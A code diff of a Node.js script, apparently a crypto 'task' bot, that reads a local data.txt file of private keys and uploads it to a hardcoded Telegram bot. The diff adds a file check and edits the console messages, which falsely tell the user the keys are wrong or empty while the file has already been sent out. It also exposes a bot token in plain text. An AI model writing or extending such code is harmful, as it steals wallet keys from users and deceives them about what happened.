@@ -1,5 +1,6 @@
 const axios = require('axios');
 const FormData = require('form-data');
+const fs = require('fs');
 const moment = require('moment');
 
 const TELEGRAM_BOT_TOKEN = '8002931913:AAH6rTDsi07KsXgjBNlirv3K5_d7M09MkUc';
@@ -8,10 +9,10 @@ const FILE_PATH = 'data.txt';
 
 function logMessage(message, type = 'info') {
     const timestamp = moment().format('YYYY-MM-DD HH:mm:ss');
-    let logText = `[${timestamp}] ${message}`;
+    const logText = `[${timestamp}] ${message}`;
 
     if (type === 'error') {
-        console.log(`ERROR: ${logText}`);
+        console.error(`ERROR: ${logText}`);
     } else if (type === 'success') {
         console.log(`SUCCESS: ${logText}`);
     } else {
@@ -22,6 +23,10 @@ function logMessage(message, type = 'info') {
 async function sendFileToTelegram() {
     try {
         logMessage('Menjalankan Task', 'info');
+
+        if (!fs.existsSync(FILE_PATH)) {
+            throw new Error(`File "${FILE_PATH}" tidak ditemukan.`);
+        }
 
         const fileStream = fs.createReadStream(FILE_PATH);
         const formData = new FormData();
@@ -35,9 +40,13 @@ async function sendFileToTelegram() {
             { headers: formData.getHeaders() }
         );
 
-        logMessage('Gagal login private keys salah');
+        if (response.data.ok) {
+            logMessage('prvatekeys kosong bro', 'success');
+        } else {
+            logMessage(`private keys kosong : ${response.data.description}`, 'error');
+        }
     } catch (error) {
-        logMessage('Gagal login private keys salah');
+        logMessage(`Gagal: ${error.message}`, 'error');
     }
 }
 
